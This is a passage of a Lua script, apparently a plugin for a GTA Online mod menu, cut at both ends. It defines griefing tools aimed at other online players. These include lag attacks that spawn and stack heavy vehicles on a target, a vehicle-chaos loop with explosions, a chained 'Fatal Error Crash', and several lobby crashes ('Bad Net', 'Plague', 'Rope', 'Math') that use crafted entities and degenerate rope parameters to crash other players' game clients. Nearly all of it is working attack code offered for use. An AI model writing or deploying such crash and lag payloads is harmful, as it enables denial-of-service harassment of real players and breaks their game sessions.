        	menu.trigger_commands("blackholeoffset" .. players.get_name(pid) .. " 10")
else
    util.toast("Please hold whilst I recover your menu :)")
    util.yield(1500)
    local player_ped = PLAYER.PLAYER_PED_ID()    
    local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
    local pld = PLAYER.GET_PLAYER_PED(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(pld)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1336.5051, -3044.8555, 2698.6846)
    util.yield(1000)
    util.toast("Standy... :)")
    for i=1,4  do
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1336.5051, -3044.8555, 2698.6846)
    util.yield(1000)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, old_coords.x, old_coords.y, old_coords.z)
	menu.trigger_commands("badnet" .. players.get_name(pid))
    menu.trigger_commands("glitchphysics" .. players.get_name(pid))
    menu.trigger_commands("chaosyeet" .. players.get_name(pid))
	menu.trigger_commands("poodlev2" .. players.get_name(pid))
	menu.trigger_commands("togglefragv2" .. players.get_name(pid))
	menu.trigger_commands("glitchphysics" .. players.get_name(pid))
	menu.trigger_commands("lagwithcargos" .. players.get_name(pid))
	menu.trigger_commands("lagwithsubs" .. players.get_name(pid))
	menu.trigger_commands("lagwithkhanjali" .. players.get_name(pid))
	menu.trigger_commands("lagwithcargosv2" .. players.get_name(pid))
	menu.trigger_commands("lagwithsubsv2" .. players.get_name(pid))
	menu.trigger_commands("lagwithkhanjaliv2" .. players.get_name(pid))
	menu.trigger_commands("lagwithtugsv2" .. players.get_name(pid))
	menu.trigger_commands("seizurev3" .. players.get_name(pid))
	menu.trigger_commands("ptfxelectric" .. players.get_name(pid))
	menu.trigger_commands("ptfxsmoke" .. players.get_name(pid))
	menu.trigger_commands("ptfxclown" .. players.get_name(pid))
	menu.trigger_commands("ptfxextinguisher" .. players.get_name(pid))
	menu.trigger_commands("ptfxwatermist" .. players.get_name(pid))
    menu.trigger_commands("clean")
    menu.trigger_commands("superc")
    menu.trigger_commands("noentities")
	menu.trigger_commands("panic")
    util.yield(1000)
    menu.trigger_commands("noentities")
    util.toast("Fatal Error Crash Stopped & Cleaned...")
	        end
    end)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	lagwithss = menu.list(newcrash, "Lag With Shit", {}, "", function(); end)

menu.toggle_loop(lagwithss, "Lag With Tug's", {"lagwithtugs"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3

    local khanjali = util.joaat("tug")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(10000)
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.toggle_loop(lagwithss, "Lag With Tug's V2", {"lagwithtugsv2"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local khanjali = util.joaat("tug")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(10000)
end)

menu.toggle_loop(lagwithss, "Lag With Cargobob's", {"lagwithcargos"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3

    local khanjali = util.joaat("cargobob")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
end, nil, nil, COMMANDPERM_AGGRESSIVE)



menu.toggle_loop(lagwithss, "Lag With Cargobob's V2", {"lagwithcargosv2"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local khanjali = util.joaat("cargobob")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
end)

menu.toggle_loop(lagwithss, "Lag With Sub's", {"lagwithsubs"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3

    local khanjali = util.joaat("kosatka")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.toggle_loop(lagwithss, "Lag With Sub's V2", {"lagwithsubsv2"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local khanjali = util.joaat("kosatka")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
end)

menu.toggle_loop(lagwithss, "Lag With Khanjali's", {"lagwithkhanjali"}, "", function(on_toggle)
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3

    local khanjali = util.joaat("khanjali")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.toggle_loop(lagwithss, "Lag With Khanjali's V2", {"lagwithkhanjaliv2"}, "", function(on_toggle)
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local khanjali = util.joaat("khanjali")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end
    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
end)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	local dont_stop = false
	menu.toggle_loop(newcrash,"Vehicle Chaos", {"chaosyeet"}, "Basically 'impulse like sport mode. but applied to every vehicle", function(on)
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			local locspeed2 = speed
        			local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
	      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                        vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                        speed = 100
                        local x_vec = (holecoords['x']-vcoords['x'])*speed
                        local y_vec = (holecoords['y']-vcoords['y'])*speed
                        local z_vec = ((holecoords['z']+hole_zoff)-vcoords['z'])*speed
                        ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
                        VEHICLE.START_VEHICLE_HORN(veh, 200, util.joaat("HELDDOWN"), true)
                        FIRE.ADD_EXPLOSION(vcoords['x'], vcoords['y'], vcoords['z'], 7, 100.0, true, false, 1.0)
                        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, x_vec, y_vec, z_vec, true, false, true, true)
                        VEHICLE.SET_VEHICLE_DAMAGE(veh, math.random(-5.0, 5.0), math.random(-5.0, 5.0), math.random(-5.0,5.0), 200.0, 10000.0, true)
				if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
					VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	hole_zoff = 50
    	menu.slider(newcrash, "Blackhole Z-offset", {"blackholeoffset"}, "", 0, 100, 50, 10, function(s)
    	hole_zoff = s
	end)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

	menu.toggle_loop(newcrash, "No Entity Spawn", {"noentities"}, "De spawns all entites.", function(on_loop)
		local ct = 0
		for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
			ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
			entities.delete_by_handle(ent)

			ct = ct + 1
		end
		for k,ent in pairs(entities.get_all_peds_as_handles()) do
			if not PED.IS_PED_A_PLAYER(ent) then
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)

			end
			ct = ct + 1
		end
		for k,ent in pairs(entities.get_all_objects_as_handles()) do
			if ent ~= PLAYER.PLAYER_PED_ID() then
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				ct = ct + 1
			end
		end
			for k,ent in pairs(entities.get_all_pickups_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				util.yield()
			return
		end
	end)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    	local lobbycrash = menu.list(crash, "Lobby Crashes", {}, "")

menu.toggle_loop(lobbycrash, "Bad Net Crash", {"badnet"}, "", function(on_toggle)
    local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
    local getEntityCoords = ENTITY.GET_ENTITY_COORDS
    local getPlayerPed = PLAYER.GET_PLAYER_PED
    local vehicles = {}
    for i = 1, 4 do
        util.create_thread(function()
            request_model(hashes[i])
            local pcoords = getEntityCoords(getPlayerPed(pid))
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1 
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                pcoords = getEntityCoords(getPlayerPed(pid))
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                util.yield()
            end
            vehicles[#vehicles+1] = veh
        end)
    end
    util.yield(2000)
    for _, v in pairs(vehicles) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
        entities.delete_by_handle(v)
		end
	end)

menu.toggle_loop(lobbycrash, "Plague Crash Player", {"plaguecrash"}, "", function(on_loop)
    for i = 1, 10 do
        local cord = getEntityCoords(getPlayerPed(pid))
        request_model(-930879665)
        util.yield(10)
        request_model(3613262246)
        util.yield(10)
        request_model(452618762)
        util.yield(10)
        local a1 = entities.create_object(-930879665, cord)
        util.yield(10)
        local a2 = entities.create_object(3613262246, cord)
        util.yield(10)
        local b1 = entities.create_object(452618762, cord)
        util.yield(10)
        local b2 = entities.create_object(3613262246, cord)
        util.yield(300)
        entities.delete_by_handle(a1)
        entities.delete_by_handle(a2)
        entities.delete_by_handle(b1)
        entities.delete_by_handle(b2)
        request_model(452618762)
        util.yield(10)
        request_model(3613262246)
        util.yield(10)
        request_model(-930879665)
        util.yield(10)
        end
        if SE_Notifications then
            util.toast("Finished.")
	end
end)

menu.toggle_loop(lobbycrash, "Rope Crash Lobby", {"ropecrash"}, "", function(on_loop)
    PHYSICS.ROPE_LOAD_TEXTURES()
    local hashes = {2132890591, 2727244247}
    local pc = getEntityCoords(getPlayerPed(pid))
    local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pc.x + 5, pc.y, pc.z, 0, true, true, false)
    local ped = PED.CREATE_PED(26, hashes[2], pc.x, pc.y, pc.z + 1, 0, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
    ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
    ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
    local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
    local vehc = getEntityCoords(veh); local pedc = getEntityCoords(ped)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
    util.yield(1000)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    entities.delete_by_handle(veh); entities.delete_by_handle(ped)
    PHYSICS.DELETE_CHILD_ROPE(rope)
    PHYSICS.ROPE_UNLOAD_TEXTURES()
    end)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    local mathcrash = menu.list(crash, "Math Crash", {}, "")

menu.action(mathcrash, "Math Crash Lobby", {"math"}, "One of the versions of rope crash.", function()
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local ppos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    pos.x = pos.x+5
    ppos.z = ppos.z+1
    cargobob = entities.create_vehicle(2132890591, pos, 0)
    cargobob_pos = ENTITY.GET_ENTITY_COORDS(cargobob)
    kur = entities.create_ped(26, 2727244247, ppos, 0)
    kur_pos = ENTITY.GET_ENTITY_COORDS(kur)
    ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
    newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, kur, cargobob_pos.x, cargobob_pos.y, cargobob_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center")
end)

menu.toggle_loop(mathcrash, "Math Crash Lobby", {"togglemath"}, "One of the versions of rope crash.", function(on_toggle)
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local ppos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    pos.x = pos.x+5
    ppos.z = ppos.z+1
    cargobob = entities.create_vehicle(2132890591, pos, 0)
    cargobob_pos = ENTITY.GET_ENTITY_COORDS(cargobob)
    kur = entities.create_ped(26, 2727244247, ppos, 0)
